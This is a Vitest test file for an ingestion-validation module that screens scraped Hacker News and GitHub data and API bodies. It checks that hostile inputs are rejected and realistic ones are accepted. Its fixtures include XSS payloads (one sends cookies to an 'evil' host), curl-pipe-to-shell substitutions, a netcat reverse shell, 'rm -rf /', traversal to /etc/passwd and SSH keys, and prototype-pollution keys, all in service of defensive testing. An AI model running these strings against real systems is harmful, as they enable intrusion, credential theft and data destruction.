/**
 * Vitest battery for ingestion-guards.ts.
 *
 * Two directions per barrier:
 *   - REJECT: malicious / oversized / malformed payloads (XSS primitives,
 *     encoded-script smuggling, command-injection footprints, prototype
 *     pollution, denial-of-wallet size bombs, unknown-key smuggling).
 *   - ACCEPT: realistic payloads shaped exactly like what the real fetchers
 *     (src/fetchers/hn.ts, gh-trending.ts), the /replen-match skill and the
 *     CLI actually produce.
 */

import { describe, expect, it } from "vitest";
import {
  LIMITS,
  scanForInjection,
  assertNoInjection,
  decodeEntitiesOnce,
  safeString,
  safeText,
  safeArray,
  boundedRecord,
  safeUrl,
  githubUrlSchema,
  githubRepoRef,
  scrapedScalar,
  scrapedProse,
  repoRelativePath,
  fetchedCandidateSchema,
  fetchedCandidateBatchSchema,
  readmeHeadSchema,
  guardFetchedBatch,
  ingestBodySchema,
  triageBodySchema,
  capabilityReportSchema,
  depVersionsSchema,
  embeddingVectorSchema,
  type AttackClass,
} from "./ingestion-guards";

const classes = (s: string, profile: "scalar" | "prose" = "scalar"): AttackClass[] =>
  scanForInjection(s, profile).map((x) => x.cls);

/* ────────────────────────────────────────────────────────────────────────── *
 * Injection scanner — malicious battery
 * ────────────────────────────────────────────────────────────────────────── */

describe("scanForInjection: script primitives", () => {
  it("flags <script> tags", () => {
    expect(classes("<script>alert(1)</script>")).toContain("script-tag");
  });

  it("flags <script tags in prose too (README profile)", () => {
    expect(classes("Install it\n\n<script src=//evil.sh></script>", "prose")).toContain("script-tag");
  });

  it("flags <iframe>, <object>, <embed>, <meta>, <base>", () => {
    for (const t of ["<iframe src=x>", "<object data=x>", "<embed src=x>", "<meta http-equiv=refresh>", "<base href=//evil>"]) {
      expect(classes(t), t).toContain("script-tag");
    }
  });

  it("flags image trackers / svg in scalar profile", () => {
    expect(classes('<img src="https://evil/pixel.gif">')).toContain("script-tag");
    expect(classes("<svg><circle/></svg>")).toContain("script-tag");
  });

  it("flags inline event handlers", () => {
    expect(classes("<img src=x onerror=alert(1)>")).toContain("event-handler");
    expect(classes("<svg/onload=alert(1)>")).toContain("event-handler");
    expect(classes('<div onmouseover = "steal()">', "prose")).toContain("event-handler");
    expect(classes("<iframe srcdoc='<script>x</script>'>")).toContain("event-handler");
  });

  it("flags javascript:/vbscript:/file: schemes in both profiles", () => {
    expect(classes("javascript:alert(document.cookie)")).toContain("dangerous-scheme");
    expect(classes("JaVaScRiPt:alert(1)", "prose")).toContain("dangerous-scheme");
    expect(classes("vbscript:msgbox(1)")).toContain("dangerous-scheme");
    expect(classes("file:///etc/passwd", "prose")).toContain("dangerous-scheme");
  });

  it("flags whitespace-split scheme smuggling", () => {
    expect(classes("java\tscript:alert(1)", "prose")).toContain("dangerous-scheme");
    expect(classes("java script:alert(1)", "prose")).toContain("dangerous-scheme");
  });

  it("flags data: URIs with a content type or base64 payload", () => {
    expect(classes("data:text/html;base64,PHNjcmlwdD4=")).toContain("data-uri");
    expect(classes("click data:image/svg+xml,<svg onload=x>", "prose")).toContain("data-uri");
  });

  it("does NOT flag prose that merely says 'data: the new oil'", () => {
    expect(classes("data: the new oil of ML pipelines", "prose")).toEqual([]);
  });
});

describe("scanForInjection: HTML entities + encoded-script smuggling", () => {
  it("flags numeric character references in scraped scalars", () => {
    expect(classes("&#106;&#97;vascript:x")).toContain("html-entity");
    expect(classes("&#x6A;avascript:x")).toContain("html-entity");
  });

  it("flags dangerous named entities in scraped scalars", () => {
    expect(classes("&lt;b&gt;bold&lt;/b&gt;")).toContain("html-entity");
    expect(classes("path&sol;to&sol;x")).toContain("html-entity");
  });

  it("decodes one entity layer and catches hidden <script>", () => {
    expect(classes("&lt;script&gt;alert(1)&lt;/script&gt;")).toContain("encoded-script");
    // prose allows raw entities but still catches entity-hidden script
    expect(classes("&lt;script&gt;alert(1)&lt;/script&gt;", "prose")).toContain("encoded-script");
  });

  it("decodes numeric refs and catches hidden javascript:", () => {
    expect(classes("&#106;avascript:alert(1)", "prose")).toContain("encoded-script");
  });

  it("decodeEntitiesOnce handles hex, decimal and named forms", () => {
    expect(decodeEntitiesOnce("&#x3C;&#62;&lt;&amp;")).toBe("<><&");
  });
});

describe("scanForInjection: command-injection footprints (scalar profile)", () => {
  it("flags $() command substitution", () => {
    expect(classes("repo $(curl https://evil.sh | sh) name")).toContain("command-substitution");
  });

  it("flags ${IFS} / ${} expansion", () => {
    expect(classes("cat${IFS}/etc/passwd")).toContain("command-substitution");
  });

  it("flags backticked shell payloads", () => {
    expect(classes("`nc -e /bin/sh 10.0.0.1 4444`")).toContain("command-substitution");
    expect(classes("`rm -rf ~`")).toContain("command-substitution");
  });

  it("flags chained shell verbs", () => {
    expect(classes("; rm -rf /")).toContain("shell-chain");
    expect(classes("x && curl evil.sh")).toContain("shell-chain");
    expect(classes("innocuous | bash")).toContain("shell-chain");
  });

  it("does NOT flag single-& titles like 'Tips & Tricks'", () => {
    expect(classes("Tips & Tricks for Rust CLIs")).toEqual([]);
  });

  it("does NOT flag shell examples in prose (READMEs contain code)", () => {
    const readme = "## Install\n\n```sh\nnpm install replen && npx replen sync\ncurl -fsSL https://example.com/install.sh | sh\n```\n";
    expect(classes(readme, "prose")).toEqual([]);
  });
});

describe("scanForInjection: control chars, invisible unicode, traversal", () => {
  it("flags NUL and C0/C1 controls in both profiles", () => {
    expect(classes("safe\u0000hidden")).toContain("control-char");
    expect(classes("a\u001bb", "prose")).toContain("control-char");
  });

  it("flags bidi override / zero-width steganography", () => {
    expect(classes("invoice\u202etxt.exe")).toContain("invisible-unicode");
    expect(classes("zero\u200bwidth", "prose")).toContain("invisible-unicode");
  });

  it("flags ../ traversal in scalar (id/path-shaped) fields", () => {
    expect(classes("../../../etc/passwd")).toContain("path-traversal");
    expect(classes("a/../b")).toContain("path-traversal");
  });

  it("assertNoInjection throws with the attack classes named", () => {
    expect(() => assertNoInjection("<script>x</script>", "scalar", "title")).toThrow(/script-tag/);
    expect(() => assertNoInjection("plain title", "scalar", "title")).not.toThrow();
  });
});

/* ────────────────────────────────────────────────────────────────────────── *
 * Helper set — safeString / safeText / safeArray / boundedRecord / safeUrl
 * ────────────────────────────────────────────────────────────────────────── */

describe("safeString / safeText", () => {
  it("accepts a normal bounded string", () => {
    expect(safeString(40).safeParse("hello world").success).toBe(true);
  });

  it("hard-fails past the cap (no silent truncation)", () => {
    expect(safeString(10).safeParse("x".repeat(11)).success).toBe(false);
  });

  it("rejects newlines/tabs in single-line fields", () => {
    expect(safeString(40).safeParse("two\nlines").success).toBe(false);
    expect(safeString(40).safeParse("tab\there").success).toBe(false);
  });

  it("rejects control and invisible characters", () => {
    expect(safeString(40).safeParse("a\u0007b").success).toBe(false);
    expect(safeString(40).safeParse("a\u200db").success).toBe(false);
  });

  it("safeText allows newlines but still rejects NUL", () => {
    expect(safeText(100).safeParse("line one\nline two").success).toBe(true);
    expect(safeText(100).safeParse("a\u0000b").success).toBe(false);
  });

  it("enforces min length and pattern when given", () => {
    const s = safeString(20, { min: 1, pattern: /^[a-z-]+$/ });
    expect(s.safeParse("").success).toBe(false);
    expect(s.safeParse("UPPER").success).toBe(false);
    expect(s.safeParse("kebab-case").success).toBe(true);
  });
});

describe("safeArray / boundedRecord", () => {
  it("safeArray rejects past maxItems", () => {
    const arr = safeArray(safeString(10), 3);
    expect(arr.safeParse(["a", "b", "c"]).success).toBe(true);
    expect(arr.safeParse(["a", "b", "c", "d"]).success).toBe(false);
  });

  it("boundedRecord accepts a small clean record", () => {
    const rec = boundedRecord({ keyMax: 30, maxKeys: 5, value: safeString(10) });
    expect(rec.safeParse({ react: "19.2.3", zod: "4.3.6" }).success).toBe(true);
  });

  it("boundedRecord rejects too many keys", () => {
    const rec = boundedRecord({ keyMax: 30, maxKeys: 5, value: safeString(10) });
    const big = Object.fromEntries(Array.from({ length: 6 }, (_, i) => [`k${i}`, "v"]));
    expect(rec.safeParse(big).success).toBe(false);
  });

  it("boundedRecord rejects __proto__ / constructor keys (prototype pollution)", () => {
    const rec = boundedRecord({ keyMax: 30, maxKeys: 5, value: safeString(10) });
    // Object literals would SET the prototype; JSON.parse creates an own
    // property named __proto__, exactly like a hostile request body does.
    const evil = JSON.parse('{"__proto__": "polluted"}');
    expect(rec.safeParse(evil).success).toBe(false);
    expect(rec.safeParse(JSON.parse('{"constructor": "x"}')).success).toBe(false);
  });

  it("boundedRecord rejects oversized or injectable keys", () => {
    const rec = boundedRecord({ keyMax: 10, maxKeys: 5, value: safeString(10) });
    expect(rec.safeParse({ ["k".repeat(11)]: "v" }).success).toBe(false);
    expect(rec.safeParse({ "<script>": "v" }).success).toBe(false);
  });
});

describe("safeUrl / githubUrlSchema / githubRepoRef", () => {
  it("accepts normal https URLs", () => {
    expect(safeUrl().safeParse("https://news.ycombinator.com/item?id=1").success).toBe(true);
  });

  it("rejects javascript: and data: schemes", () => {
    expect(safeUrl().safeParse("javascript:alert(1)").success).toBe(false);
    expect(safeUrl().safeParse("data:text/html,<script>x</script>").success).toBe(false);
    expect(safeUrl().safeParse("file:///etc/passwd").success).toBe(false);
  });

  it("rejects embedded credentials (SSRF/pretexting)", () => {
    expect(safeUrl().safeParse("https://admin:hunter2@github.com/a/b").success).toBe(false);
  });

  it("hard-fails past the 2048 cap (mirrors /api/ingest)", () => {
    expect(safeUrl().safeParse("https://x.dev/" + "a".repeat(2048)).success).toBe(false);
  });

  it("githubUrlSchema pins the host to github.com", () => {
    expect(githubUrlSchema().safeParse("https://github.com/acme/geo-join").success).toBe(true);
    expect(githubUrlSchema().safeParse("https://github.com.evil.com/a/b").success).toBe(false);
    expect(githubUrlSchema().safeParse("https://gitlab.com/a/b").success).toBe(false);
  });

  it("githubRepoRef enforces the owner/name shape from /api/triage", () => {
    expect(githubRepoRef.safeParse("vercel/next.js").success).toBe(true);
    expect(githubRepoRef.safeParse("../../etc/passwd").success).toBe(false);
    expect(githubRepoRef.safeParse("owner/repo/extra").success).toBe(false);
    expect(githubRepoRef.safeParse("a".repeat(40) + "/repo").success).toBe(false); // 39-char owner cap
  });
});

/* ────────────────────────────────────────────────────────────────────────── *
 * Ingestion border — fetched candidates
 * ────────────────────────────────────────────────────────────────────────── */

// Shaped exactly like src/fetchers/hn.ts output.
const hnCandidate = {
  source: "hn",
  sourceItemId: "40123456",
  title: "Show HN: Fast geospatial joins in DuckDB",
  url: "https://news.ycombinator.com/item?id=40123456",
  githubUrl: "https://github.com/acme/geo-join",
  author: "someuser",
  score: 245,
  postedAt: new Date(),
  raw: { objectID: "40123456", points: 245, story_text: null },
};

// Shaped like src/fetchers/gh-trending.ts output with Sprint-1 metadata.
const trendingCandidate = {
  source: "gh-trending",
  sourceItemId: "acme/vision-kit",
  title: "acme/vision-kit: Zero-shot object detection toolkit",
  url: "https://github.com/acme/vision-kit",
  githubUrl: "https://github.com/acme/vision-kit",
  author: null,
  score: 1234,
  postedAt: null,
  raw: { window: "daily", lang: "python" },
  primaryLanguage: "Python",
  topics: ["computer-vision", "object-detection", "onnx"],
  repoShape: "library" as const,
};

describe("fetchedCandidateSchema: accepts real fetcher shapes", () => {
  it("accepts an HN-shaped candidate", () => {
    expect(fetchedCandidateSchema.safeParse(hnCandidate).success).toBe(true);
  });

  it("accepts a gh-trending-shaped candidate with topics + repoShape", () => {
    expect(fetchedCandidateSchema.safeParse(trendingCandidate).success).toBe(true);
  });
});

describe("fetchedCandidateSchema: rejects hostile candidates", () => {
  it("rejects a script-bearing title before it reaches embeddings/footnote", () => {
    const r = fetchedCandidateSchema.safeParse({
      ...hnCandidate,
      title: 'Nice lib <img src=x onerror="fetch(`//evil/${document.cookie}`)">',
    });
    expect(r.success).toBe(false);
  });

  it("rejects an entity-encoded script title", () => {
    expect(
      fetchedCandidateSchema.safeParse({ ...hnCandidate, title: "&lt;script&gt;alert(1)&lt;/script&gt;" }).success,
    ).toBe(false);
  });

  it("rejects command-substitution in author (shell-adjacent fields)", () => {
    expect(
      fetchedCandidateSchema.safeParse({ ...hnCandidate, author: "$(curl evil.sh|sh)" }).success,
    ).toBe(false);
  });

  it("rejects oversized title (denial-of-wallet on the embedding pass)", () => {
    expect(
      fetchedCandidateSchema.safeParse({ ...hnCandidate, title: "A".repeat(LIMITS.TITLE_MAX + 1) }).success,
    ).toBe(false);
  });

  it("rejects a topics flood and oversized topics", () => {
    expect(
      fetchedCandidateSchema.safeParse({
        ...trendingCandidate,
        topics: Array.from({ length: LIMITS.TOPICS_MAX + 1 }, (_, i) => `t${i}`),
      }).success,
    ).toBe(false);
    expect(
      fetchedCandidateSchema.safeParse({ ...trendingCandidate, topics: ["x".repeat(LIMITS.TOPIC_MAX + 1)] }).success,
    ).toBe(false);
  });

  it("rejects a raw payload past the 64 KB byte cap", () => {
    expect(
      fetchedCandidateSchema.safeParse({ ...hnCandidate, raw: { blob: "z".repeat(LIMITS.RAW_JSON_MAX_BYTES) } }).success,
    ).toBe(false);
  });

  it("rejects non-github githubUrl and non-http url", () => {
    expect(
      fetchedCandidateSchema.safeParse({ ...hnCandidate, githubUrl: "https://bitbucket.org/a/b" }).success,
    ).toBe(false);
    expect(
      fetchedCandidateSchema.safeParse({ ...hnCandidate, url: "javascript:alert(1)" }).success,
    ).toBe(false);
  });

  it("rejects implausible score / postedAt values", () => {
    expect(fetchedCandidateSchema.safeParse({ ...hnCandidate, score: 10 ** 12 }).success).toBe(false);
    expect(fetchedCandidateSchema.safeParse({ ...hnCandidate, score: 1.5 }).success).toBe(false);
    expect(
      fetchedCandidateSchema.safeParse({ ...hnCandidate, postedAt: new Date("2099-01-01") }).success,
    ).toBe(false);
  });

  it("rejects unknown keys (strictObject: no field smuggling)", () => {
    expect(fetchedCandidateSchema.safeParse({ ...hnCandidate, embedding: [1, 2, 3] }).success).toBe(false);
  });
});

describe("batch guards", () => {
  it("fetchedCandidateBatchSchema hard-fails past BATCH_MAX", () => {
    const batch = Array.from({ length: LIMITS.BATCH_MAX + 1 }, () => ({ ...hnCandidate }));
    expect(fetchedCandidateBatchSchema.safeParse(batch).success).toBe(false);
    expect(fetchedCandidateBatchSchema.safeParse([hnCandidate, trendingCandidate]).success).toBe(true);
  });

  it("guardFetchedBatch drops poisoned items, keeps the rest, reports reasons", () => {
    const { accepted, rejected } = guardFetchedBatch([
      hnCandidate,
      { ...hnCandidate, sourceItemId: "poison", title: "<script>alert(1)</script>" },
      trendingCandidate,
    ]);
    expect(accepted).toHaveLength(2);
    expect(rejected).toHaveLength(1);
    expect(rejected[0].index).toBe(1);
    expect(rejected[0].reasons.join(" ")).toMatch(/script-tag/);
  });

  it("guardFetchedBatch rejects overflow items past BATCH_MAX", () => {
    const batch = Array.from({ length: LIMITS.BATCH_MAX + 3 }, () => ({ ...hnCandidate }));
    const { accepted, rejected } = guardFetchedBatch(batch);
    expect(accepted).toHaveLength(LIMITS.BATCH_MAX);
    expect(rejected).toHaveLength(3);
  });

  it("guardFetchedBatch refuses non-array input", () => {
    const { accepted, rejected } = guardFetchedBatch({ not: "an array" });
    expect(accepted).toHaveLength(0);
    expect(rejected[0].reasons[0]).toMatch(/not an array/);
  });
});

describe("readmeHeadSchema (prose profile on scraped README heads)", () => {
  it("accepts a legit README head with code fences, entities and inline <details>", () => {
    const head =
      "# vision-kit\n\nZero-shot detection. R&D friendly — data & weights included.\n\n" +
      "<details><summary>Install</summary>\n\n```sh\npip install vision-kit && vision-kit demo\n```\n</details>\n";
    expect(readmeHeadSchema.safeParse(head).success).toBe(true);
  });

  it("rejects a README head hiding a script primitive", () => {
    expect(readmeHeadSchema.safeParse("intro\n<script>fetch('//evil')</script>").success).toBe(false);
  });

  it("rejects a README head past the char ceiling", () => {
    expect(readmeHeadSchema.safeParse("x".repeat(LIMITS.README_HEAD_MAX + 1)).success).toBe(false);
  });
});

/* ────────────────────────────────────────────────────────────────────────── *
 * API border — /api/ingest and /api/triage
 * ────────────────────────────────────────────────────────────────────────── */

describe("ingestBodySchema", () => {
  it("accepts a legit bookmarklet body", () => {
    expect(
      ingestBodySchema.safeParse({
        url: "https://github.com/acme/geo-join",
        title: "Fast geospatial joins",
        note: "Check for the replen watchtower lens\nmaybe port the join kernel",
      }).success,
    ).toBe(true);
  });

  it("rejects unknown keys (no smuggling extra columns)", () => {
    expect(
      ingestBodySchema.safeParse({ url: "https://github.com/a/b", score: 100 }).success,
    ).toBe(false);
  });

  it("rejects oversized url/title/note (mirrors + hardens route caps)", () => {
    expect(ingestBodySchema.safeParse({ url: "https://g.co/" + "a".repeat(2049) }).success).toBe(false);
    expect(
      ingestBodySchema.safeParse({ url: "https://github.com/a/b", title: "t".repeat(201) }).success,
    ).toBe(false);
    expect(
      ingestBodySchema.safeParse({ url: "https://github.com/a/b", note: "n".repeat(1001) }).success,
    ).toBe(false);
  });

  it("rejects XSS in title and note", () => {
    expect(
      ingestBodySchema.safeParse({ url: "https://github.com/a/b", title: "<svg/onload=alert(1)>" }).success,
    ).toBe(false);
    expect(
      ingestBodySchema.safeParse({ url: "https://github.com/a/b", note: "see javascript:void(0)" }).success,
    ).toBe(false);
  });
});

describe("triageBodySchema", () => {
  const legit = {
    repo: "acme/vision-kit",
    project: "replen",
    verdict: "port" as const,
    score: 82,
    effortBand: "moderate" as const,
    oneLine: "Port the zero-shot head; the rest duplicates our stack.",
    writeup: "## Verdict\n\nThe detection head fits the `cv-ingest` capability.\nEffort: 2 days.",
    sessionId: "sess_2026-07-06_abc123",
    matchedFacet: "computer vision",
    facetModality: "image",
    reasonCode: "fit" as const,
    cosine: 0.71,
    depsConfirmed: ["onnxruntime", "@libsql/client"],
    depsSuperseded: ["npm:moment"],
  };

  it("accepts a realistic skill-posted triage body", () => {
    expect(triageBodySchema.safeParse(legit).success).toBe(true);
  });

  it("accepts repoId instead of repo", () => {
    expect(triageBodySchema.safeParse({ repoId: 42, verdict: "skip" }).success).toBe(true);
  });

  it("rejects when neither repo nor repoId is given", () => {
    expect(triageBodySchema.safeParse({ verdict: "adopt" }).success).toBe(false);
  });

  it("rejects out-of-vocabulary verdict/effort/reason", () => {
    expect(triageBodySchema.safeParse({ ...legit, verdict: "yolo" }).success).toBe(false);
    expect(triageBodySchema.safeParse({ ...legit, effortBand: "heroic" }).success).toBe(false);
    expect(triageBodySchema.safeParse({ ...legit, reasonCode: "vibes" }).success).toBe(false);
  });

  it("rejects out-of-range score / cosine", () => {
    expect(triageBodySchema.safeParse({ ...legit, score: 101 }).success).toBe(false);
    expect(triageBodySchema.safeParse({ ...legit, cosine: 1.5 }).success).toBe(false);
  });

  it("rejects oversized oneLine (280) and writeup (16 KB bytes)", () => {
    expect(triageBodySchema.safeParse({ ...legit, oneLine: "x".repeat(281) }).success).toBe(false);
    // 6,000 euro signs = 6,000 chars (under the 20k char cap) but 18,000
    // UTF-8 bytes (over the 16 KB byte cap) — the multibyte bypass the
    // byte-length check exists to stop.
    expect(triageBodySchema.safeParse({ ...legit, writeup: "€".repeat(6000) }).success).toBe(false);
  });

  it("rejects script primitives in the writeup (it lands in Atlas Tiles)", () => {
    expect(
      triageBodySchema.safeParse({ ...legit, writeup: "ok\n<iframe src=//evil></iframe>" }).success,
    ).toBe(false);
  });

  it("rejects malformed repo refs and dep floods", () => {
    expect(triageBodySchema.safeParse({ ...legit, repo: "owner/repo/extra" }).success).toBe(false);
    expect(
      triageBodySchema.safeParse({
        ...legit,
        depsConfirmed: Array.from({ length: LIMITS.DEPS_LIST_MAX + 1 }, (_, i) => `dep-${i}`),
      }).success,
    ).toBe(false);
    expect(triageBodySchema.safeParse({ ...legit, depsConfirmed: ["rm -rf /"] }).success).toBe(false);
  });

  it("rejects unknown keys", () => {
    expect(triageBodySchema.safeParse({ ...legit, isAdmin: true }).success).toBe(false);
  });
});

/* ────────────────────────────────────────────────────────────────────────── *
 * CLI / MCP border — capability reports, dep versions, embeddings
 * ────────────────────────────────────────────────────────────────────────── */

describe("capabilityReportSchema", () => {
  const legit = {
    repo: "acme/replen",
    purpose: "Tool/library discovery for AI coding workflows.",
    goals: ["calm cadence: 1-3 matches/month", "no per-user LLM bill"],
    capabilities: [
      "semantic-retrieval",
      {
        tag: "capability-facet-embeddings",
        descriptor: "Per-capability facet vectors so a candidate matches the strongest single capability.",
        modality: ["text"],
        paths: ["src/projects/facets.ts", "src/lib/embeddings.ts"],
      },
    ],
    report: "# Replen\n\nMatching core (Brainstem) + source network (Watchtower).\n",
  };

  it("accepts a realistic onboarding capability report", () => {
    expect(capabilityReportSchema.safeParse(legit).success).toBe(true);
  });

  it("rejects traversal / absolute evidence paths", () => {
    expect(repoRelativePath.safeParse("src/lib/embeddings.ts").success).toBe(true);
    expect(repoRelativePath.safeParse("../../.ssh/id_rsa").success).toBe(false);
    expect(repoRelativePath.safeParse("/etc/passwd").success).toBe(false);
    expect(repoRelativePath.safeParse("C:\\Windows\\system32").success).toBe(false);
  });

  it("rejects goal/capability floods and oversized descriptors", () => {
    expect(
      capabilityReportSchema.safeParse({
        ...legit,
        goals: Array.from({ length: LIMITS.GOALS_MAX + 1 }, (_, i) => `goal ${i}`),
      }).success,
    ).toBe(false);
    expect(
      capabilityReportSchema.safeParse({
        ...legit,
        capabilities: [{ tag: "x", descriptor: "d".repeat(LIMITS.CAP_DESCRIPTOR_MAX + 1) }],
      }).success,
    ).toBe(false);
  });

  it("rejects a report past the 32 KB byte cap", () => {
    expect(
      capabilityReportSchema.safeParse({ ...legit, report: "€".repeat(11_000) }).success,
    ).toBe(false);
  });

  it("rejects XSS in capability tags", () => {
    expect(
      capabilityReportSchema.safeParse({ ...legit, capabilities: ["<script>alert(1)</script>"] }).success,
    ).toBe(false);
  });
});

describe("depVersionsSchema", () => {
  it("accepts a realistic lockfile-derived record", () => {
    expect(
      depVersionsSchema.safeParse({
        react: "19.2.3",
        "@libsql/client": "^0.17.4",
        "npm:moment": "2.30.1",
        node: ">=20",
      }).success,
    ).toBe(true);
  });

  it("rejects prototype-pollution keys arriving as JSON", () => {
    expect(depVersionsSchema.safeParse(JSON.parse('{"__proto__": "1.0.0"}')).success).toBe(false);
  });

  it("rejects a key flood past DEP_RECORD_MAX_KEYS", () => {
    const flood = Object.fromEntries(
      Array.from({ length: LIMITS.DEP_RECORD_MAX_KEYS + 1 }, (_, i) => [`pkg-${i}`, "1.0.0"]),
    );
    expect(depVersionsSchema.safeParse(flood).success).toBe(false);
  });

  it("rejects shell metacharacters in names and versions", () => {
    expect(depVersionsSchema.safeParse({ "left-pad; rm -rf /": "1.0.0" }).success).toBe(false);
    expect(depVersionsSchema.safeParse({ "left-pad": "1.0.0`curl evil`" }).success).toBe(false);
  });
});

describe("embeddingVectorSchema", () => {
  const unit = Array.from({ length: LIMITS.EMBEDDING_DIM }, () => 0.01);

  it("accepts a 1536-dim finite vector", () => {
    expect(embeddingVectorSchema.safeParse(unit).success).toBe(true);
  });

  it("rejects wrong dimensionality (both directions)", () => {
    expect(embeddingVectorSchema.safeParse(unit.slice(0, 1535)).success).toBe(false);
    expect(embeddingVectorSchema.safeParse([...unit, 0.01]).success).toBe(false);
  });

  it("rejects NaN / Infinity / magnitude bombs (cosine poisoning)", () => {
    expect(embeddingVectorSchema.safeParse([...unit.slice(0, 1535), NaN]).success).toBe(false);
    expect(embeddingVectorSchema.safeParse([...unit.slice(0, 1535), Infinity]).success).toBe(false);
    expect(embeddingVectorSchema.safeParse([...unit.slice(0, 1535), 1e9]).success).toBe(false);
  });
});

/* ────────────────────────────────────────────────────────────────────────── *
 * Legit-content regression guard: things the barriers must NOT block
 * ────────────────────────────────────────────────────────────────────────── */

describe("false-positive guard on realistic scraped text", () => {
  const legitScalars = [
    "Show HN: I built a SQLite-backed vector store",
    "acme/vision-kit: Zero-shot object detection toolkit",
    "Rust 1.88 released with async closures",
    "Tips & Tricks for Rust CLIs",
    "How we cut our OpenAI bill by 90%",
    "left-pad@2.0.0 is out",
  ];

  it.each(legitScalars)("scalar profile passes: %s", (s) => {
    expect(scanForInjection(s, "scalar")).toEqual([]);
    expect(scrapedScalar(300).safeParse(s).success).toBe(true);
  });

  it("prose profile passes agent writeups with markdown + code spans", () => {
    const writeup =
      "## Why\n\nUse `duckdb.spatial` for the join; keep `@turf/boolean-intersects` for the edge cases.\n\n" +
      "- effort: quick\n- risk: none\n";
    expect(scanForInjection(writeup, "prose")).toEqual([]);
    expect(scrapedProse(20_000).safeParse(writeup).success).toBe(true);
  });
});
